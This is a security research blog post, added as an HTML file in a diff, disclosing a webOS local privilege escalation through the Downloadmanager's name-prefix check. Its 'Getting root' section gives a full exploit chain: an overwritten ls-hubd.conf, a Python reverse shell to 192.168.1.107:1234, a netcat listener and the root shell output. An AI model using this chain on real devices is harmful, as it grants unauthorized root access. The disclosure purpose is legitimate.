@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      CVE-2020-XXXXX - Getting root on webOS &middot; The Recurity Lablog
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/styles.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- feed -->
+  <link type="application/atom+xml" rel="alternate" href="http://blog.recurity-labs.com/atom.xml" title="The Recurity Lablog" />
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">The Recurity Lablog</h2>
+        </a>
+        <ul>
+          <li><a href="/">Posts</a></li>
+        </ul>
+       <br>computer security, research, reverse engineering and high level considerations 
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by&nbsp;</span>Andreas
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2021-02-03 00:00:00 -0600">February 03, 2021</time>
+    
+  </div>
+
+  <h1 class="post-title">CVE-2020-XXXXX - Getting root on webOS</h1>
+  <div class="post-line"></div>
+
+  <h1 id="the-tldr">The TL;DR</h1>
+
+<p>A while back, I decided to devote some research time looking into the inner workings of webOS to be able to better understand the security posture of the platform as whole, and to better be able to spot security issues in webOS applications. This led to some interesting discoveries, including a local privilege escalation method, which will be outlined in this blog post.</p>
+
+<h1 id="some-caveats">Some Caveats</h1>
+
+<p>As part of the LG webOS TV SDK, LG provides a webOS TV emulator running on <a href="https://www.qemu.org/">QEMU</a>. This post will use this emulator, running webOS version 5.0.0-88, to demonstrate the issue.</p>
+
+<p>Now, before we start, it should be noted that this issue does <em>not</em> affect the one webOS hardware device in my possession; an LG Smart TV with model name 65SM8500PLA and webOS version 4.8.0-52002. This is due to customizations made by LG, which restrict access to the vulnerable component. LG furthermore claims that this is the case for all their devices running webOS, which may well be the case (or not).</p>
+
+<p>However, as the root cause of the issue is within code rather than LG’s custom configuration, we feel that it is still valid. As far as Recurity Labs are aware, LG is the maintainer of the <a href="https://github.com/webosose">webOS Open Source Edition (OSE)</a>, which (to date) has not been updated to remediate this issue, even though LG claims that it has been fixed. This implies that the root cause will not be remediated. This also means that LG, despite our repeated inquires, did not request a CVE number for this issue - hence the title “CVE-2020-XXXXX” (the issue was initially reported to LG on October 05, 2020).</p>
+
+<p>It is also interesting to note that LG repeatedly tried to play down the issues (yes, plural, but that’s for another time) I reported, but as soon as I mentioned that I was going to do a write-up they turned around and asked if I wouldn’t rather participate in their bug bounty program instead. If there is one thing that is constant in this world …</p>
+
+<h1 id="webos---a-brief-history">webOS - A Brief History</h1>
+
+<p><a href="https://en.wikipedia.org/wiki/WebOS">webOS</a> is a Linux-based operating system and media application platform for smart embedded devices. It was originally developed by <a href="https://en.wikipedia.org/wiki/Palm,_Inc.">Palm, Inc.</a> and later included in the acquisition of Palm by HP, who released the source code under an open source license in 2011, which became known as Open webOS. In 2013, HP sold webOS to LG Electronics, who started using it in their smart TVs, refrigerators, watches etc. In 2018, LG announced the <a href="https://github.com/webosose">webOS Open Source Edition (OSE)</a>, which includes additional features for smart TVs and other devices developed by LG.</p>
+
+<h1 id="high-level-architecture">High-Level Architecture</h1>
+
+<p>Applications in webOS are called “Web Apps”, and are essentially JavaScript client applications executed in a locked-down headless browser, with some additional management handled by the internal <code class="language-plaintext highlighter-rouge">WebAppManager</code> service. The apps are run by unprivileged users, and have very limited access to the filesystem. Applications can also implement services, which are run in <code class="language-plaintext highlighter-rouge">node.js</code> and must be packaged and included within the application’s <code class="language-plaintext highlighter-rouge">.ipk</code> package. These services are run as the same unprivileged user as the apps themselves.</p>
+
+<p>webOS also implements the Luna Service API, which enables Web apps as well as internal system services to call different APIs for interacting with webOS features and the underlying system. The APIs are made available via “Luna Bus”, which exposes one private and one public channel. The APIs are somewhat logically grouped together, and can include both public (exposed by the public channel and available to any app) and private (exposed by the private channel and only available for internal or privileged communication) methods. Furthermore, each method can (and often does) implement their own access controls, for more granular access restrictions.</p>
+
+<p>And this is where our story begins …</p>
+
+<h1 id="a-case-of-mistaken-identity">A Case of Mistaken Identity</h1>
+
+<p>One of the APIs the Luna Service provides is the <code class="language-plaintext highlighter-rouge">Downloadmanager</code>. Like all internal APIs, the <code class="language-plaintext highlighter-rouge">Downloadmanager</code> runs as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root       900  0.0  0.9  15356  9332 ?        SLs  09:06   0:00 /usr/bin/LunaDownloadMgr
+</code></pre></div></div>
+
+<p>The most essential method the <code class="language-plaintext highlighter-rouge">Downloadmanager</code> implements is simply called <code class="language-plaintext highlighter-rouge">download</code>, and enables an application or service to download a file over the network. This method is callable by any application and accepts a number of parameters, but implements its own restrictions with regard to where the file will be downloaded, and what it will be called. This is enforced by checking that the calling application has one of the privileged prefixes <code class="language-plaintext highlighter-rouge">com.palm.</code>, <code class="language-plaintext highlighter-rouge">com.webos.</code>, or <code class="language-plaintext highlighter-rouge">com.palm.</code>, which third-party applications are not allowed to use.</p>
+
+<p>From the <code class="language-plaintext highlighter-rouge">DownloadService.cpp</code> class:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// only privileged service don't have restrictions
+    if (!isPrivileged(caller))
+</code></pre></div></div>
+
+<p>And from the <code class="language-plaintext highlighter-rouge">DownloadManager.cpp</code> class:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool DownloadManager::isPrivileged(const std::string&amp; sender)
+{
+    if(sender.find("com.palm.") == 0 || sender.find("com.webos.") == 0 || sender.find("com.lge.") == 0 )
+        return true;
+
+    return false;
+}
+</code></pre></div></div>
+
+<p>If this check fails, the service will disregard any parameter except <code class="language-plaintext highlighter-rouge">target</code>, which specifies the file to download, and will instead download the file to the default location <code class="language-plaintext highlighter-rouge">/media/internal/downloads</code> on the filesystem.</p>
+
+<p>However, privileged applications that pass the check, such as internal services and native applications, are able to set additional parameters, such as <code class="language-plaintext highlighter-rouge">targetDir</code> and <code class="language-plaintext highlighter-rouge">targetFilename</code> (which forces existing files with the same name to be overwritten). These options are used, e.g. when the system installs applications via the Internet, for example by an App Store.</p>
+
+<p>After spending a fair amount of time trying to figure out how to get past this check (but sadly to no avail), I decided to look elsewhere. Enter the <code class="language-plaintext highlighter-rouge">luna-send</code> tool.</p>
+
+<p>webOS implements a pair of command line tools located in <code class="language-plaintext highlighter-rouge">/usr/bin</code> called <code class="language-plaintext highlighter-rouge">luna-send</code> and <code class="language-plaintext highlighter-rouge">luna-send-pub</code>, which can be used to call the Luna Service APIs locally from the command line. <code class="language-plaintext highlighter-rouge">luna-send</code> is used to call private API methods and is only available to the <code class="language-plaintext highlighter-rouge">root</code> user, whereas <code class="language-plaintext highlighter-rouge">luna-send-pub</code> is used to call public methods and, hence, can be called by any user. These tools are frequently used by internal webOS startup and maintenance scripts, making them a fundamental part of the platform.</p>
+
+<p>When inspecting the source code for the <code class="language-plaintext highlighter-rouge">luna-send</code> binaries, I noticed the following extract_</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const char PUBLIC_SERVICE_NAME[] = "com.webos.lunasendpub";
+const char PRIVATE_SERVICE_NAME[] = "com.webos.lunasend";
+</code></pre></div></div>
+
+<p>As it turns out, the name <code class="language-plaintext highlighter-rouge">luna-send-pub</code> used when communicating with the Luna Service API is <code class="language-plaintext highlighter-rouge">com.webos.lunasendpub</code>, which means that it will effectively pass the check implemented by the <code class="language-plaintext highlighter-rouge">Downloadmanager</code>, and will thus be considered a privileged caller. This effectively enables us to be able to download arbitrary files to any writable part of the filesystem as the <code class="language-plaintext highlighter-rouge">root</code> user, since the <code class="language-plaintext highlighter-rouge">Downloadmanager</code> is running as <code class="language-plaintext highlighter-rouge">root</code>. Please keep in mind that this is possible for any application implementing its own service, for example by using the <code class="language-plaintext highlighter-rouge">node.js</code> <code class="language-plaintext highlighter-rouge">child_process</code> module to call <code class="language-plaintext highlighter-rouge">luna-send-pub</code> on the command line.</p>
+
+<p>(The implications of a design in which a command line tool can call internal system services <em>and</em> essentially specify its own permissions through whatever name it choses for itself is not lost on the author, but will be explored in a different blog post.)</p>
+
+<p>While arbitrary file downloads as <code class="language-plaintext highlighter-rouge">root</code> is an issue in itself, I of course also wanted to try to use it for something more interesting, and hence began the hunt for a local privilege escalation.</p>
+
+<h1 id="setting-the-scene">Setting the Scene</h1>
+
+<p>The LG webOS TV Emulator, which was mainly used for the dynamic parts of this project, grants developers the same type of unprivileged shell access to webOS as a third-party application has. For an easier overview, all following steps will be shown using the shell directly rather than via a Web App service. For those, who would like to implement a Web App that does the same things, LG offers some basic documentation on how to write apps and services on their developer website available <a href="http://webostv.developer.lge.com/develop/building-your-first-web-app-webos-tv/">here</a>.</p>
+
+<p>The following guide can be used to root the LG webOS TV Emulator, but may need some tweaking with regard to which files and directories to use on other webOS devices and implementations.</p>
+
+<h1 id="getting-root">Getting root</h1>
+
+<p>While we are now able to download files to anywhere on the filesystem (if mounted as writable), we still cannot make the files we download executable as they will be owned by the <code class="language-plaintext highlighter-rouge">root</code> user, meaning that simply overwriting some binary or shell script will likely not be very effective. What we can do, however, is overwrite a configuration file specifying the path to an executable, and then point it to our own executable someplace on the filesystem where we have the necessary privileges. After looking around a bit, I found a good candidate for this in the <code class="language-plaintext highlighter-rouge">/etc/luna-service2/ls-hubd.conf</code> file. This is the configuration file for the Luna hub daemon, which acts as a middleman for internal communication, and contains the following extract:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Dynamic Services]
+ExecPrefix=/usr/sbin/setcpushares-ls2
+LaunchTimeout=300000
+</code></pre></div></div>
+
+<p>On inspection, the <code class="language-plaintext highlighter-rouge">/usr/sbin/setcpushares-ls2</code> file contains the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+
+# usage: $0 cmd args...
+# Used by LS2 as a wrapper for invoking dynamic services that ensures they are in the correct groups
+
+exec "$@"
+</code></pre></div></div>
+
+<p>This file appears to be a shell script used to launch dynamic services, likely during start-up. As the Luna Service hub daemon runs as <code class="language-plaintext highlighter-rouge">root</code>, this means that, if we can overwrite the configuration file and point the <code class="language-plaintext highlighter-rouge">ExecPrefix</code> to our own script file, it will be possible to run arbitrary commands within the script as the <code class="language-plaintext highlighter-rouge">root</code> user.</p>
+
+<p>To achieve this, the following steps can be taken:</p>
+
+<p>1) On a local computer, create the file <code class="language-plaintext highlighter-rouge">ls-hubd.conf</code> with the following content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[General]
+PidDirectory=/var/run/ls2
+LogServiceStatus=false
+ConnectTimeout=20000
+
+[Watchdog]
+Timeout=60
+FailureMode=noop
+
+[Dynamic Services]
+ExecPrefix=/home/developer/setcpushares-ls
+LaunchTimeout=300000
+
+[Security]
+Enabled=true
+MonitorExePath=/usr/sbin/ls-monitor
+JsServiceExePath=js
+AllowNullOutboundByDefault=true
+ContainersDirectories=/usr/share/luna-service2/containers.d
+ManifestsDirectories=/usr/share/luna-service2/manifests.d;/mnt/otycabi/usr/share/luna-service2/manifests.d;/mnt/otncabi/usr/share/luna-service2/manifests.d
+ManifestsVolatileDirectories=/var/luna-service2/manifests.d;/var/luna-service2-dev/manifests.d
+DevmodeCertificate=/var/luna-service2-dev/devmode_certificate.json
+DefaultDevmodeCertificate=/usr/share/luna-service2/devmode_certificate.json
+</code></pre></div></div>
+
+<p>Notice that the <code class="language-plaintext highlighter-rouge">ExecPrefix</code> value has been modified to point to <code class="language-plaintext highlighter-rouge">home/developer/setcpushares-ls</code>. The reason for not simply overwriting the script file is because, on most embedded devices, the <code class="language-plaintext highlighter-rouge">/usr/sbin</code> directory is likely to be mounted as read-only, whereas <code class="language-plaintext highlighter-rouge">/etc/</code> (the location of the config file) might not be. On the LG webOS TV Emulator, the <code class="language-plaintext highlighter-rouge">/home/developer</code> directory is writable by our unprivileged user, on other devices some other directory may have to be used.</p>
+
+<p>2) Next, create the file <code class="language-plaintext highlighter-rouge">home/developer/setcpushares-ls</code> with the following content on the webOS device:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+
+# usage: $0 cmd args...
+# Used by LS2 as a wrapper for invoking dynamic services that ensures they are in the correct groups
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.107",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+exec "$@"
+</code></pre></div></div>
+
+<p>3) Make this file executable with the command <code class="language-plaintext highlighter-rouge">chmod +x setcpushares-ls</code>.</p>
+
+<p>(If it is somehow necessary to also download the modified script file, the path in <code class="language-plaintext highlighter-rouge">ExecPrefix</code> can simply be replaced with <code class="language-plaintext highlighter-rouge">/bin/sh /path/to/script</code> to get around the need to make the script file executable.)</p>
+
+<p>4) Download the modified <code class="language-plaintext highlighter-rouge">ls-hubd.conf</code> file to the webOS device using the following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luna-send-pub -n 1 -f luna://com.webos.service.downloadmanager/download '{"target":"http://192.168.1.107:8000/ls-hubd.conf","targetDir":"/etc/luna-service2","targetFilename":"ls-hubd.conf"}'
+</code></pre></div></div>
+
+<p>5) After this, open a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 1234 on the IP address specified in the Python reverse shell in step 2.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -l 1234
+</code></pre></div></div>
+
+<p>6) Restart the webOS device. Once the system is completely started, the <code class="language-plaintext highlighter-rouge">netcat</code> listener set-up in step 5 should receive a connection, granting <code class="language-plaintext highlighter-rouge">root</code> access to the system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andreas@deathstar2:~$ nc -l 1234
+/bin/sh: can't access tty; job control turned off
+/ # id
+uid=0(root) gid=0(root)
+/ # uname -a
+Linux qemux86 4.18.14-yocto-standard #1 SMP PREEMPT Fri Feb 7 05:57:22 UTC 2020 x86_64 GNU/Linux
+</code></pre></div></div>
+
+<p>At this point, I simply changed the password of the <code class="language-plaintext highlighter-rouge">root</code> user, and replaced the Python reverse shell in the <code class="language-plaintext highlighter-rouge">/home/developer/setcpushares-ls</code> file with a command to open an additional SSH listener with <code class="language-plaintext highlighter-rouge">root</code> and password login allowed. This will provide stable access to a much nicer root shell, and should aid further research.</p>
+
+<h1 id="final-thoughts">Final Thoughts</h1>
+
+<p>While LG claims that this issue does not affect their devices, it is our impression that it affects webOS in general, and therefore should be taken seriously. In the commincation flow, LG claimed that it would be fixed “within a week” on the 26th of January 2021 (the issue was initially reported to LG on October 05, 2020), and since that time has well passed, and due to the fact that the issue is not remotely exploitable, we decided to release this information.</p>
+
+<p>If nothing else it may aid other fellow hackers by granting <code class="language-plaintext highlighter-rouge">root</code> access to the LG webOS emulator.</p>
+
+
+</div>
+
+<div class="pagination">
+  
+    <a href="http://blog.recurity-labs.com/2021-08-09/safari_hsts" class="left arrow">&#8592;</a>
+  
+  
+    <a href="http://blog.recurity-labs.com/2020-12-23/code-audit-training-archive" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2021-08-10 02:07:31 -0500">2021</time> Recurity Labs. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+        <br><a href="https://www.recurity-labs.com/company/GDPR">GDPR / DS-GVO Statement</a>
+      </span>
+    </footer>
+  </body>
+</html>
